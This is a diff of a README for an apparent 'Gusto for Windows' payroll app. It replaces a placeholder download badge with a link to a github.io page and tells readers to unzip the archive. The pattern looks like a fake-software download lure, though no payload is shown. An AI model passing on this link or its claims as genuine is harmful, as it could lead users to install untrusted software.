@@ -6,7 +6,7 @@ Gusto for Windows streamlines payroll processing, employee onboarding, benefits 
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://gusto-windows-app.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
